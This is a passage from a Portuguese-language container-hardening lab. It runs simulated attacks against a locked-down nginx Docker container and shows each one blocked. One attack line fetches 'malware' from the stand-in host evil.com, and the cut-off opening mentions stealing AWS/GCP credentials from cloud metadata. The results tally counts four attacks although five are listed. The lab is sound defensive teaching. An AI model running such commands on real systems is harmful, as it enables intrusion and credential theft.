# Metadata de cloud! ← Credenciais AWS/GCP!

# Parar e remover:
docker rm -f inseguro

# ── PARTE B: CONTAINER HARDENED ──────────────────────────────

# Subir container COM proteções:
docker run -d --name hardened \
  --user 1000:1000 \
  --read-only \
  --cap-drop=ALL \
  --security-opt=no-new-privileges:true \
  --tmpfs /tmp:rw,noexec,nosuid,size=16m \
  --network=none \
  -p 127.0.0.1:8080:8080 \
  nginx:alpine

# ATAQUE 1: Verificar se é root
docker exec hardened whoami
# nginx ou nobody ← Atacante não é root!

# ATAQUE 2: Tentar instalar ferramentas
docker exec hardened apk add curl
# ERROR: Permission denied ← BLOQUEADO!

# ATAQUE 3: Tentar escrever no filesystem
docker exec hardened touch /backdoor.sh
# Read-only file system ← BLOQUEADO!

# ATAQUE 4: Tentar acessar rede
docker exec hardened wget http://evil.com/malware
# Network unreachable ← BLOQUEADO! (--network=none)

# ATAQUE 5: Tentar escalação de privilégio
docker exec hardened su root
# Permission denied ← no-new-privileges!

# RESULTADO:
# Container inseguro: 4/4 ataques bem-sucedidos ❌
# Container hardened: 0/4 ataques bem-sucedidos ✅

# LIÇÃO: Cada camada de defesa bloqueia um vetor de ataque.
# Combinadas, tornam a exploração extremamente difícil.

# VALIDAÇÃO:
# ✅ Container hardened bloqueia TODOS os ataques
# ✅ Não é possível instalar ferramentas
# ✅ Não é possível escrever no filesystem
# ✅ Não é possível acessar rede externa
# ✅ Não é possível escalar privilégios
